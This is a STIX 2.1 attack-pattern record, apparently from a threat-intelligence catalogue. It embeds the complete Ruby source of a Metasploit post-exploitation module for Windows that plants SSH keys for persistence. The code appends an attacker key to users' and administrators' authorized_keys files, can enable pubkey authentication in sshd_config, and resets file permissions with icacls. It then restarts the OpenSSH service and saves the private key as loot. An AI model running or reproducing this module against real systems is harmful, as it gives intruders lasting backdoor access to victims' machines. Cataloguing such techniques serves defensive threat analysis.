{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26172393-0778-4aac-9798-bdeea0da49d7",
    "created": "2024-08-14T16:33:04.977011Z",
    "modified": "2024-08-14T16:33:04.977015Z",
    "name": "SSH Key Persistence",
    "description": " This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/sshkey_persistence.rb",
            "external_id": "sshkey_persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'sshkey'\n\nclass MetasploitModule < Msf::Post\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SSH Key Persistence',\n        'Description' => %q{\n          This module will add an SSH key to a specified user (or all), to allow\n          remote login via SSH at any time.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Dean Welch <dean_welch[at]rapid7.com>'\n        ],\n        'Platform' => [ 'windows' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_mkdir\n              stdapi_fs_separator\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'User to add SSH key to (Default: all users on box)' ]),\n        OptPath.new('PUBKEY', [false, 'Public Key File to use. (Default: Create a new one)' ]),\n        OptString.new('SSHD_CONFIG', [true, 'sshd_config file', 'C:\\ProgramData\\ssh\\sshd_config' ]),\n        OptString.new('ADMIN_KEY_FILE', [true, 'Admin key file', 'C:\\ProgramData\\ssh\\administrators_authorized_keys' ]),\n        OptBool.new('EDIT_CONFIG', [true, 'Edit ssh config to allow public key authentication', false ]),\n        OptBool.new('ADMIN', [true, 'Add keys for administrator accounts', false ]),\n        OptBool.new('CREATESSHFOLDER', [true, 'If no .ssh folder is found, create it for a user', false ])\n      ], self.class\n    )\n  end\n\n  def run\n    sep = separator\n\n    sshd_config = read_file(datastore['SSHD_CONFIG'])\n\n    print_status('Checking SSH Permissions')\n    if !pub_key_auth_allowed?(sshd_config) && datastore['EDIT_CONFIG']\n      enable_pub_key_auth(sshd_config)\n    end\n\n    auth_key_file = auth_key_file_name(sshd_config)\n\n    print_status(\"Authorized Keys File: #{auth_key_file}\")\n\n    auth_key_folder = auth_key_file.split('/')[0...-1].join(sep)\n    auth_key_file = auth_key_file.split('/')[-1]\n\n    paths = []\n    if datastore['USERNAME']\n      grab_user_profiles.each do |profile|\n        paths << \"#{profile['ProfileDir']}#{sep}#{auth_key_folder}\" if profile['UserName'] == datastore['USERNAME']\n      end\n    end\n\n    if datastore['ADMIN'] # SSH keys for admin accounts are stored in a separate location\n      admin_auth_key_folder = datastore['ADMIN_KEY_FILE'].split(sep)[0...-1].join(sep)\n      admin_auth_key_file = datastore['ADMIN_KEY_FILE'].split(sep)[-1]\n\n      print_status(\"Admin Authorized Keys File: #{admin_auth_key_file}\")\n\n      write_key([admin_auth_key_folder], admin_auth_key_file, sep)\n    end\n\n    if !datastore['USERNAME'] && !datastore['ADMIN']\n      grab_user_profiles.each do |profile|\n        paths << \"#{profile['ProfileDir']}#{sep}#{auth_key_folder}\"\n      end\n    end\n\n    if datastore['CREATESSHFOLDER'] == true\n      create_ssh_folder(paths)\n    end\n\n    paths = paths.select { |d| directory?(d) }\n    unless paths.empty?\n      write_key(paths, auth_key_file, sep)\n    end\n\n    restart_openssh\n  end\n\n  def enable_pub_key_auth(sshd_config)\n    sshd_config = sshd_config.sub(/^.*(PubkeyAuthentication).*$/, 'PubkeyAuthentication yes')\n    write_file(datastore['SSHD_CONFIG'], sshd_config)\n  end\n\n  def pub_key_auth_allowed?(sshd_config)\n    /^PubkeyAuthentication\\s+(?<pub_key>yes|no)/ =~ sshd_config\n    if pub_key && pub_key == 'no'\n      print_error('Pubkey Authentication disabled')\n    elsif pub_key\n      vprint_good(\"Pubkey set to #{pub_key}\")\n    end\n  end\n\n  def auth_key_file_name(sshd_config)\n    %r{^AuthorizedKeysFile\\s+(?<auth_key_file>[\\w%/.]+)} =~ sshd_config\n    if auth_key_file\n      auth_key_file = auth_key_file.gsub('%h', '')\n      auth_key_file = auth_key_file.gsub('%%', '%')\n      if auth_key_file.start_with? '/'\n        auth_key_file = auth_key_file[1..]\n      end\n    else\n      auth_key_file = '.ssh/authorized_keys'\n    end\n    auth_key_file\n  end\n\n  def create_ssh_folder(paths)\n    vprint_status(\"Attempting to create ssh folders that don't exist\")\n    paths.each do |p|\n      unless directory?(p)\n        print_status(\"Creating #{p} folder\")\n        session.fs.dir.mkdir(p)\n      end\n    end\n  end\n\n  def restart_openssh\n    cmd_exec('net stop \"OpenSSH SSH Server\"')\n    cmd_exec('net start \"OpenSSH SSH Server\"')\n  end\n\n  def set_pub_key_file_permissions(file)\n    cmd_exec(\"icacls #{file} /inheritance:r\")\n    cmd_exec(\"icacls #{file} /grant SYSTEM:(F)\")\n    cmd_exec(\"icacls #{file} /grant BUILTIN\\\\Administrators:(F)\")\n  end\n\n  def separator\n    if session.type == 'meterpreter'\n      sep = session.fs.file.separator\n    else\n      # Guess, but it's probably right\n      sep = '\\\\'\n    end\n    sep\n  end\n\n  def write_key(paths, auth_key_file, sep)\n    if datastore['PUBKEY'].nil?\n      key = SSHKey.generate\n      our_pub_key = key.ssh_public_key\n      loot_path = store_loot('id_rsa', 'text/plain', session, key.private_key, 'ssh_id_rsa', 'OpenSSH Private Key File')\n      print_good(\"Storing new private key as #{loot_path}\")\n    else\n      our_pub_key = ::File.read(datastore['PUBKEY'])\n    end\n    paths.each do |path|\n      path.chomp!\n      authorized_keys = \"#{path}#{sep}#{auth_key_file}\"\n      print_status(\"Adding key to #{authorized_keys}\")\n      append_file(authorized_keys, \"\\n#{our_pub_key}\")\n      print_good('Key Added')\n      set_pub_key_file_permissions(authorized_keys)\n      next unless datastore['PUBKEY'].nil?\n\n      path_array = path.split(sep)\n      path_array.pop\n      user = path_array.pop\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :ssh_key,\n        private_data: key.private_key.to_s,\n        username: user,\n        workspace_id: myworkspace_id\n      }\n\n      create_credential(credential_data)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}